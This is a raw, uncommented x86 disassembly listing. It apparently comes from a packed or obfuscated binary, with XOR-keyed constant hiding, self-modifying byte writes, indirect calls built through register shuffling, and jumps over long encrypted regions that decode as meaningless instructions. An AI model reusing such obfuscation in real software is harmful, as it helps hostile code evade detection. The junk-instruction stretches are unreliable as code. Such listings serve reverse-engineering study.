  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0xef
  40f16c:	pop    esp
  40f16d:	je     0x40f13a
  40f16f:	and    BYTE PTR [esi+0x79f47e7e],dh
  40f175:	jle    0x40f1f5
  40f177:	call   0x4481:0x803ecb05
  40f17e:	loopne 0x40f15d
  40f180:	rol    DWORD PTR [ecx],cl
  40f182:	ins    DWORD PTR es:[edi],dx
  40f183:	sbb    DWORD PTR [edi+0x1a144955],ecx
  40f189:	out    0xe3,eax
  40f18b:	pop    esi
  40f18c:	sub    cl,0xfd
  40f18f:	sti    
  40f190:	data16 and al,0xf4
  40f193:	mov    edi,0x92084e41
  40f198:	(bad)  
  40f199:	stos   BYTE PTR es:[edi],al
  40f19a:	jae    0x40f135
  40f19c:	les    ecx,FWORD PTR [edx]
  40f19e:	mov    bh,0xfb
  40f1a0:	xor    cl,bh
  40f1a2:	sar    BYTE PTR [ebx-0x1284dd01],0x1
  40f1a9:	dec    eax
  40f1aa:	push   esi
  40f1ab:	pop    es
  40f1ac:	stc    
  40f1ad:	mul    BYTE PTR [edi+0x73673719]
  40f1b3:	out    0x13,eax
  40f1b5:	xchg   edx,eax
  40f1b6:	sub    dh,BYTE PTR [edi+0xcb19cc8]
  40f1bc:	jle    0x40f198
  40f1be:	mov    edi,0xcdaf2abd
  40f1c3:	das    
  40f1c4:	mov    ecx,edi
  40f1c6:	mov    ds:0x57aa789f,al
  40f1cb:	lahf   
  40f1cc:	pusha  
  40f1cd:	fwait
  40f1ce:	mov    edx,DWORD PTR [esi+0x13cc1f18]
  40f1d4:	retf   
  40f1d5:	sbb    DWORD PTR [esi+ebx*4],edx
  40f1d8:	in     al,dx
  40f1d9:	aad    0x5f
  40f1db:	pop    esi
  40f1dc:	xchg   ecx,eax
  40f1dd:	jp     0x40f218
  40f1df:	daa    
  40f1e0:	je     0x40f1fb
  40f1e2:	fcom   QWORD PTR [ebp+0x146894bf]
  40f1e8:	cwde   
  40f1e9:	sbb    ebx,ebp
  40f1eb:	(bad)  
  40f1ed:	adc    DWORD PTR [edx+0x66],ebp
  40f1f0:	shr    DWORD PTR [ecx+edx*8+0x7a],cl
  40f1f4:	imul   ebx,DWORD PTR [ebx],0xc3732924
  40f1fa:	scas   al,BYTE PTR es:[edi]
  40f1fb:	neg    BYTE PTR [edi+0x2a]
  40f1fe:	adc    DWORD PTR [eax+0x30],0xffffffb5
  40f202:	jmp    0x40f185
  40f204:	cmp    DWORD PTR [ebp+0x4a],ebp
  40f207:	mov    al,cl
  40f209:	cmp    bh,BYTE PTR [edx+0x10a3de59]
  40f20f:	mov    bh,ah
  40f211:	out    dx,eax
  40f212:	xchg   esi,eax
  40f213:	(bad)  
  40f214:	scas   al,BYTE PTR es:[edi]
  40f215:	push   ebp
  40f216:	inc    esi
  40f217:	out    dx,eax
  40f218:	mov    al,0x0
  40f21a:	or     eax,0x87173e70
  40f21f:	pop    edi
  40f220:	jle    0x40f285
  40f222:	repnz fwait
  40f224:	mov    esp,0x18a0ad07
  40f229:	test   eax,0x8c6918d2
  40f22e:	jne    0x40f282
  40f230:	mov    DWORD PTR [edx],esi
  40f232:	loop   0x40f220
  40f234:	dec    ecx
  40f235:	xchg   edi,eax
  40f236:	pop    es
  40f237:	ror    ecx,cl
  40f239:	neg    DWORD PTR [esi]
  40f23b:	xchg   edi,eax
  40f23c:	jle    0x40f1e8
  40f23e:	pop    esp
  40f23f:	loopne 0x40f1fc
  40f241:	cmp    BYTE PTR [eax],bh
  40f243:	fisubr WORD PTR [esi+0x71]
  40f246:	and    ebx,DWORD PTR [esi]
  40f248:	mov    ecx,0x26212c97
  40f24d:	or     eax,0xc5dfea4f
  40f252:	xchg   edi,eax
  40f253:	es adc eax,0x78c829d8
  40f259:	stos   DWORD PTR es:[edi],eax
  40f25a:	rol    BYTE PTR [edi-0x62ee20a4],1
  40f260:	dec    eax
  40f261:	leave  
  40f262:	cmp    al,0x71
  40f264:	xlat   BYTE PTR ds:[ebx]
  40f265:	ins    BYTE PTR es:[edi],dx
  40f266:	pusha  
  40f267:	and    al,0x6c
  40f269:	data16 imul BYTE PTR [ecx-0x45]
  40f26d:	pop    esi
  40f26e:	adc    DWORD PTR [ebp-0x48],ecx
  40f271:	in     eax,dx
  40f272:	and    ecx,ebx
  40f274:	(bad)  
  40f275:	lahf   
  40f276:	ret    
  40f277:	sub    ch,ch
  40f279:	xchg   esi,eax
  40f27a:	cmp    DWORD PTR [esi-0x3f],0xffffffd2
  40f27e:	iret   
  40f27f:	popa   
  40f280:	pop    ds
  40f281:	adc    DWORD PTR [edx],0xf
  40f284:	je     0x40f20e
  40f286:	xchg   esp,eax
  40f287:	std    
  40f288:	push   cs
  40f289:	cmp    dl,BYTE PTR [edx]
  40f28b:	fmul   DWORD PTR [edx]
  40f28d:	gs mov ecx,0xc8ca0d02
  40f293:	hlt    
  40f294:	inc    edi
  40f295:	push   edx
  40f296:	sbb    edx,DWORD PTR [eax+0xa]
  40f299:	push   ebp
  40f29a:	cmp    dl,BYTE PTR [ecx-0x29388810]
  40f2a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2a1:	xor    BYTE PTR [ebx],0x0
  40f2a4:	pop    ebp
  40f2a5:	and    BYTE PTR [ebx+eax*2],dh
  40f2a8:	sbb    BYTE PTR [ebx-0x6c],0xae
  40f2ac:	retf   0x8872
  40f2af:	mov    cl,BYTE PTR [edi+0x374b26cf]
  40f2b5:	jo     0x40f298
  40f2b7:	call   0x3e1c705b
  40f2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2bd:	scas   eax,DWORD PTR es:[edi]
  40f2be:	js     0x40f2fc
  40f2c0:	xor    cl,BYTE PTR [ebp+0x4945d865]
  40f2c6:	dec    esp
  40f2c7:	and    eax,0x6b0dcb5c
  40f2cc:	fstp   TBYTE PTR [ebp+0x67]
  40f2cf:	gs pushf 
  40f2d1:	shl    cl,0xd5
  40f2d4:	pusha  
  40f2d5:	stc    
  40f2d6:	mov    edx,0xef592738
  40f2db:	mov    ecx,DWORD PTR [ebp-0x4e]
  40f2de:	add    edx,DWORD PTR [eax+0x6e]
  40f2e1:	fisubr WORD PTR [ebp+0x6664dd46]
  40f2e7:	xor    eax,0x3031ea83
  40f2ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2ed:	add    BYTE PTR [esi],bh
  40f2ef:	push   ebx
  40f2f0:	push   cs
  40f2f1:	loopne 0x40f344
  40f2f3:	cmp    bl,cl
  40f2f5:	mov    ds:0x828ad19,al
  40f2fa:	scas   al,BYTE PTR es:[edi]
  40f2fb:	jno    0x40f322
  40f2fd:	pop    esi
  40f2fe:	jo     0x40f2c4
  40f300:	popa   
  40f301:	cmp    BYTE PTR [ebx],bh
  40f303:	enter  0xe473,0x7f
  40f307:	mov    ah,0xec
  40f309:	out    0x7,eax
  40f30b:	lods   eax,DWORD PTR ds:[esi]
  40f30c:	inc    esi
  40f30d:	fcom   st(7)
  40f30f:	jge    0x40f34b
  40f311:	sbb    cl,BYTE PTR cs:[ebx+edi*4-0x2c]
  40f316:	add    DWORD PTR [esi-0x7ed6fae6],esi
  40f31c:	xor    eax,0xcd9b5880
  40f321:	jle    0x40f39c
  40f323:	mov    ebx,0x1d4e16c1
  40f328:	sahf   
  40f329:	jmp    0x40f39a
  40f32b:	pop    esi
  40f32c:	test   DWORD PTR [ecx+0x18616c86],ebx
  40f332:	xchg   DWORD PTR [esi-0x6d59794],eax
  40f338:	in     al,0x12
  40f33a:	in     al,dx
  40f33b:	add    BYTE PTR [ecx+0x34],0x48
  40f33f:	mov    bh,0xbd
  40f341:	mov    edx,0xeecc4f00
  40f346:	jnp    0x40f2eb
  40f348:	out    0xe7,al
  40f34a:	nop
  40f34b:	mov    dh,0xc1
  40f34d:	xchg   DWORD PTR [ebp-0x4a9ec8a0],ebx
  40f353:	cmp    eax,0x14d30e9d
  40f358:	pop    edi
  40f359:	mov    eax,0x49f39e9e
  40f35e:	mov    edi,0x635b911a
  40f363:	mov    esi,0xb704c92c
  40f368:	(bad)  
  40f369:	dec    eax
  40f36a:	das    
  40f36b:	adc    al,BYTE PTR [esi+0x370cad1c]
  40f371:	dec    eax
  40f372:	and    eax,0xeb9e1367
  40f377:	dec    edi
  40f378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f379:	clc    
  40f37a:	inc    esi
  40f37b:	push   ebp
  40f37c:	test   BYTE PTR [esi+edx*1-0x57d5b283],0xbd
  40f384:	mov    ch,0x3e
  40f386:	add    al,0x5b
  40f388:	xlat   BYTE PTR ds:[ebx]
  40f389:	std    
  40f38a:	mov    esp,0x1af2017b
  40f38f:	iret   
  40f390:	fnstsw WORD PTR [esp+esi*2-0x7ef34ea7]
  40f397:	psubd  mm1,QWORD PTR [ecx]
  40f39a:	or     esi,DWORD PTR [edx+0x3d8dcac3]
  40f3a0:	ficom  WORD PTR [ecx]
  40f3a2:	push   ebp
  40f3a3:	popf   
  40f3a4:	push   es
  40f3a5:	out    0x34,eax
  40f3a7:	and    BYTE PTR [edi],bl
  40f3a9:	dec    ecx
  40f3aa:	mov    eax,ds:0x7b19c9d4
  40f3af:	jle    0x40f41a
  40f3b1:	out    0xa3,eax
  40f3b3:	lea    edi,[eax]
  40f3b5:	push   es
  40f3b6:	loopne 0x40f403
  40f3b8:	xchg   ecx,eax
  40f3b9:	pop    ss
  40f3ba:	jp     0x40f381
  40f3bc:	lahf   
  40f3bd:	cs ss ja 0x40f34b
  40f3c1:	push   ebp
  40f3c2:	xlat   BYTE PTR ds:[ebx]
  40f3c3:	inc    ebx
  40f3c4:	fidiv  DWORD PTR [eax+0x7b90a09f]
  40f3ca:	mov    ds:0x934ae52e,al
  40f3cf:	jecxz  0x40f44e
  40f3d1:	ja     0x40f372
  40f3d3:	add    BYTE PTR [edx-0x65789177],dh
  40f3d9:	clc    
  40f3da:	mov    ebx,0xb460bcbb
  40f3df:	xchg   esp,eax
  40f3e0:	lods   eax,DWORD PTR ds:[esi]
  40f3e1:	out    dx,eax
  40f3e2:	repnz inc ebp
  40f3e4:	jp     0x40f3f0
  40f3e6:	sbb    eax,0xc313e627
  40f3eb:	outs   dx,DWORD PTR ds:[esi]
  40f3ec:	push   ecx
  40f3ed:	jb     0x40f3af
  40f3ef:	lahf   
  40f3f0:	stos   BYTE PTR es:[edi],al
  40f3f1:	cmp    BYTE PTR [edx-0x2e3e3c87],bh
  40f3f7:	xor    esi,esp
  40f3f9:	sbb    DWORD PTR [esi-0x470a570a],eax
  40f3ff:	push   cs
  40f400:	mov    al,ds:0xc89cd282
  40f405:	dec    esp
  40f406:	ret    
  40f407:	mov    dl,0xad
  40f409:	out    dx,al
  40f40a:	sub    DWORD PTR ds:0x686c384f,0xa321b2e0
  40f414:	push   ebx
  40f415:	out    0x3e,al
  40f417:	jmp    0x438faaac
  40f41c:	xchg   esp,eax
  40f41d:	and    eax,0x68dd4aee
  40f422:	(bad)  
  40f423:	push   edi
  40f424:	xor    ebp,DWORD PTR [ebp-0x4c90a376]
  40f42a:	dec    edi
  40f42b:	mov    ?,WORD PTR [ecx]
  40f42d:	and    al,0x8
  40f42f:	pusha  
  40f430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f431:	push   0x4a
  40f433:	xchg   esp,eax
  40f434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f435:	sbb    DWORD PTR [edi+0x41],ecx
  40f438:	dec    edx
  40f439:	jae    0x40f491
  40f43b:	test   BYTE PTR [ebx-0x5a],ah
  40f43e:	out    0xb0,al
  40f440:	fdivr  QWORD PTR [eax]
  40f442:	inc    eax
  40f443:	mov    esi,0x8ded8a7e
  40f448:	mov    ah,0xbe
  40f44a:	ins    BYTE PTR es:[edi],dx
  40f44b:	test   BYTE PTR [eax],dl
  40f44d:	push   ebx
  40f44e:	ror    BYTE PTR [eax],0x14
  40f451:	xor    DWORD PTR ds:0x96d3b564,0xffffffbf
  40f458:	jmp    0x4d80:0x5d3514db
  40f45f:	outs   dx,DWORD PTR ds:[esi]
  40f460:	mov    ch,0x95
  40f462:	jp     0x40f424
  40f464:	jno    0x40f4a4
  40f466:	pop    esi
  40f467:	cmp    BYTE PTR [edx+0x3b604900],dl
  40f46d:	mov    esi,0x68032aea
  40f472:	sub    bl,BYTE PTR [edx-0xe]
  40f475:	ds or  DWORD PTR ss:[eax+eiz*1+0x2fc2e4ef],esp
  40f47e:	test   al,0x95
  40f480:	adc    al,0x4d
  40f482:	mov    ah,0x79
  40f484:	jge    0x40f4a1
  40f486:	mov    edx,0xf5fc3088
  40f48b:	sbb    DWORD PTR [ebx+0x42],ebx
  40f48e:	ss repz push esp
  40f491:	sub    esp,DWORD PTR [edx]
  40f493:	cmc    
  40f494:	(bad)  
  40f495:	mov    ?,WORD PTR [eax+0x307f9280]
  40f49b:	and    eax,0xd28b5172
  40f4a0:	(bad)  
  40f4a1:	(bad)  
  40f4a2:	lock fnsave [esi-0x6c]
  40f4a6:	push   ebp
  40f4a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a8:	xor    al,0xf3
  40f4aa:	cwde   
  40f4ab:	xchg   esp,eax
  40f4ac:	jle    0x40f51c
  40f4ae:	aad    0xb2
  40f4b0:	repz (bad) 
  40f4b2:	cmp    al,0xfe
  40f4b4:	and    BYTE PTR [edi+0x48],dl
  40f4b7:	jo     0x40f522
  40f4b9:	pop    esp
  40f4ba:	sahf   
  40f4bb:	cdq    
  40f4bc:	xchg   esi,eax
  40f4bd:	pop    ebx
  40f4be:	sbb    DWORD PTR [ecx],esp
  40f4c0:	push   edi
  40f4c1:	aas    
  40f4c2:	xor    DWORD PTR [ebp+0xb],edi
  40f4c5:	xchg   esp,eax
  40f4c6:	add    al,0xff
  40f4c8:	adc    eax,0x74bbb9d8
  40f4cd:	or     BYTE PTR [ebp+0x32c4f473],bh
  40f4d3:	outs   dx,DWORD PTR ds:[esi]
  40f4d4:	or     al,0xe
  40f4d6:	add    esi,DWORD PTR [edi+0x57]
  40f4d9:	xlat   BYTE PTR ds:[ebx]
  40f4da:	mov    esp,0x74a95083
  40f4df:	(bad)  
  40f4e0:	mov    BYTE PTR [ebx+0x44a9e908],ah
  40f4e6:	je     0x40f4c1
  40f4e8:	dec    edx
  40f4e9:	retf   0x2282
  40f4ec:	std    
  40f4ed:	push   ecx
  40f4ee:	push   ecx
  40f4ef:	mov    eax,0xf89c8539
  40f4f4:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  40f4fb:	mov    DWORD PTR ds:0x43477b,0x36a0
  40f505:	push   esi
  40f506:	mov    ecx,DWORD PTR ds:0x43478b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x434753,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x43477f,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x4346bf,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43470b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi-0x75]
  40f561:	or     BYTE PTR [edi+ebx*4-0x62],dh
  40f565:	mov    cl,0x7e
  40f567:	jle    0x40f55d
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f591
  40f56d:	jle    0x40f5d4
  40f56f:	inc    edi
  40f570:	std    
  40f571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f572:	loopne 0x40f568
  40f574:	in     eax,0x76
  40f576:	sbb    eax,0xa60bc2e4
  40f57b:	jb     0x40f5bf
  40f57d:	and    bl,BYTE PTR [esi-0x7e]
  40f580:	or     eax,0x11d975a8
  40f585:	xchg   ebx,eax
  40f586:	into   
  40f587:	enter  0x4b73,0x9a
  40f58b:	xor    ah,ah
  40f58d:	dec    ebp
  40f58e:	jmp    0x36502bdf
  40f593:	(bad)  
  40f594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f595:	push   eax
  40f596:	fiadd  DWORD PTR [ebp+edi*2-0x8ce0f9e]
  40f59d:	fisub  DWORD PTR [edx]
  40f59f:	aad    0xea
  40f5a1:	(bad)  
  40f5a2:	je     0x40f5f3
  40f5a4:	mov    al,0x7
  40f5a6:	jns    0x40f566
  40f5a8:	inc    ebp
  40f5a9:	lea    edx,[ebp+0x36]
  40f5ac:	retf   
  40f5ad:	xor    DWORD PTR [ebp+0x79e0762b],0x30f8805b
  40f5b7:	inc    eax
  40f5b8:	ds retf 
  40f5ba:	mov    edx,0x3ab79805
  40f5bf:	jecxz  0x40f5eb
  40f5c1:	sub    dh,BYTE PTR [esi]
  40f5c3:	das    
  40f5c4:	dec    esi
  40f5c5:	sbb    DWORD PTR [ecx-0x154ee82b],eax
  40f5cb:	sub    eax,0x8deef3c5
  40f5d0:	push   ecx
  40f5d1:	add    al,0x2b
  40f5d3:	call   0x4cf:0xc54dcaa5
  40f5da:	cmp    al,0x3e
  40f5dc:	push   ds
  40f5dd:	les    ebp,FWORD PTR [edx+eax*1-0x71233bd1]
  40f5e4:	add    DWORD PTR [ecx+0xd],0xffffffd8
  40f5e8:	repz test eax,edi
  40f5eb:	dec    esi
  40f5ec:	je     0x40f578
  40f5ee:	adc    al,BYTE PTR [ebx]
  40f5f0:	xchg   BYTE PTR [ecx+0x6ded219e],bl
  40f5f6:	fs loop 0x40f63b
  40f5f9:	out    dx,al
  40f5fa:	push   es
  40f5fb:	sub    ebx,ecx
  40f5fd:	and    bh,ah
  40f5ff:	jmp    0x40f5c1
  40f601:	mov    ds:0x20508a1b,al
  40f606:	mov    ds:0xd55278a0,al
  40f60b:	mov    al,BYTE PTR [edi-0x6b]
  40f60e:	int3   
  40f60f:	addr16 or bh,cl
  40f612:	push   0xffffffed
  40f614:	ja     0x40f68f
  40f616:	sbb    edi,edi
  40f618:	cmp    BYTE PTR [esi+0x7cbd7c9a],dl
  40f61e:	int3   
  40f61f:	adc    al,0xfe
  40f621:	sti    
  40f622:	enter  0xcfb8,0x85
  40f626:	enter  0x22b3,0xbb
  40f62a:	stc    
  40f62b:	and    ebp,0xcb859f7
  40f631:	outs   dx,BYTE PTR ds:[esi]
  40f632:	clc    
  40f633:	pop    eax
  40f634:	mov    eax,ds:0xfe9dd2ba
  40f639:	xor    BYTE PTR [edi-0x3e887af0],0x9b
  40f640:	enter  0x4d5,0xb4
  40f644:	xchg   ebx,eax
  40f645:	mov    BYTE PTR [esi],0xbe
  40f648:	mov    BYTE PTR [edx-0x800b187],ah
  40f64e:	clc    
  40f64f:	sub    BYTE PTR [ecx+0x25eebf7e],ah
  40f655:	call   0x2fd16f7f
  40f65a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f65b:	in     eax,dx
  40f65c:	mov    ebx,0x5989ceba
  40f661:	(bad)  
  40f663:	out    0xd9,al
  40f665:	xchg   ebx,eax
  40f666:	sub    al,0xaf
  40f668:	jo     0x40f6a3
  40f66a:	add    BYTE PTR [ecx-0x60cae8f6],bh
  40f670:	ret    
  40f671:	mov    ds:0x40569d4c,eax
  40f676:	fsubr  st(1),st
  40f678:	push   ebx
  40f679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f67a:	fnsave [ecx]
  40f67c:	jbe    0x40f614
  40f67e:	inc    ebp
  40f67f:	pop    esp
  40f680:	lahf   
  40f681:	std    
  40f682:	inc    eax
  40f683:	push   eax
  40f684:	call   0xe2ea:0x6d58a37b
  40f68b:	jg     0x40f662
  40f68d:	or     eax,0x1d6f2567
  40f692:	pop    ecx
  40f693:	mov    eax,ds:0xfa6e74fb
  40f698:	bound  eax,QWORD PTR [edi-0x16]
  40f69b:	adc    edi,DWORD PTR [esi-0x28221b02]
  40f6a1:	or     BYTE PTR [esi-0x61],cl
  40f6a4:	adc    esp,edx
  40f6a6:	mov    bl,0xb3
  40f6a8:	push   edi
  40f6a9:	jl     0x40f6e8
  40f6ab:	(bad)  
  40f6ac:	cmp    eax,0xc62b599b
  40f6b1:	je     0x40f70e
  40f6b3:	or     BYTE PTR [ecx],bl
  40f6b5:	in     al,0xdc
  40f6b7:	pop    ebx
  40f6b8:	ins    DWORD PTR es:[edi],dx
  40f6b9:	jae    0x40f679
  40f6bb:	push   ss
  40f6bc:	jae    0x40f68a
  40f6be:	dec    esp
  40f6bf:	in     al,dx
  40f6c0:	adc    esp,DWORD PTR [ebx-0x64]
  40f6c3:	sub    DWORD PTR [ebp-0x7102a8b0],0x2d
  40f6ca:	pop    ds
  40f6cb:	jae    0x40f71e
  40f6cd:	and    al,0xbb
  40f6cf:	dec    edi
  40f6d0:	ds xchg si,ax
  40f6d3:	push   ss
  40f6d4:	rcr    cl,0xff
  40f6d7:	jo     0x40f748
  40f6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6da:	cwde   
  40f6db:	sbb    DWORD PTR [esi-0x7f1b4cab],ecx
  40f6e1:	xor    edi,DWORD PTR [edx-0x3d14dae2]
  40f6e7:	mov    ?,WORD PTR [esi+0x6c]
  40f6ea:	mov    eax,ds:0x449437a9
  40f6ef:	and    eax,0x501aadf7
  40f6f4:	cmp    BYTE PTR [ecx],dl
  40f6f6:	mov    al,ds:0x581de321
  40f6fb:	fidivr WORD PTR [edx-0x16]
  40f6fe:	xor    bh,BYTE PTR [ebx+0x4509e0]
  40f704:	cwde   
  40f705:	push   edx
  40f706:	mov    eax,ds:0xb74e11bb
  40f70b:	rcl    BYTE PTR [ecx+0x704ed8f0],0xad
  40f712:	rcl    DWORD PTR [ebx+0x61],cl
  40f715:	pop    es
  40f716:	and    al,0x88
  40f718:	int    0x67
  40f71a:	dec    edi
  40f71b:	jmp    0x23f2759c
  40f720:	push   esi
  40f721:	jns    0x40f6b5
  40f723:	dec    ebp
  40f724:	mov    bl,0x62
  40f726:	shr    DWORD PTR [ecx+0x52],cl
  40f729:	mov    WORD PTR [ecx],gs
  40f72b:	lds    edi,FWORD PTR [eax-0x688dce89]
  40f731:	cmc    
  40f732:	xchg   ebp,eax
  40f733:	ins    BYTE PTR es:[edi],dx
  40f734:	out    dx,al
  40f735:	fprem1 
  40f737:	ins    DWORD PTR es:[edi],dx
  40f738:	lods   al,BYTE PTR ds:[esi]
  40f739:	cmp    ecx,DWORD PTR [ebx+0x501f9274]
  40f73f:	mov    bh,0xe2
  40f741:	mov    ebp,0x7a29c144
